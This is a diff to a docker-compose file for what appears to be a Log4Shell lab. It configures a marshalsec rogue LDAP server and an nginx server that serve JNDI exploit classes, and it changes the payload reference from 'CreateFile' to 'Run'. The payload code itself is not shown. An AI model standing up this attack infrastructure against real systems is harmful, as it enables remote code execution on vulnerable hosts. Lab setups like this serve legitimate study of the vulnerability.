@@ -2,7 +2,7 @@ version: '3.5'
 
 services:
   ldap-server:
-    build: ldap-server/
+    build: attacker-server/ldap-server/
     container_name: ldap-server
     ports:
       - 1389:1389
@@ -11,17 +11,17 @@ services:
       - -cp
       - /usr/app/marshalsec-0.0.3-SNAPSHOT-all.jar
       - marshalsec.jndi.LDAPRefServer
-      - http://127.0.0.1:8888/exploits/#CreateFile
+      - http://127.0.0.1:8888/exploits/#Run
     restart: always
     networks:
       log4j:
   web-server:
-    build: web-server/
+    build: attacker-server/web-server/
     container_name: web-server
     ports:
       - 8888:8888
     volumes:
-      - ./web-server/conf:/etc/nginx/conf.d
+      - ./attacker-server/web-server/conf:/etc/nginx/conf.d
     restart: always
     depends_on:
       - ldap-server
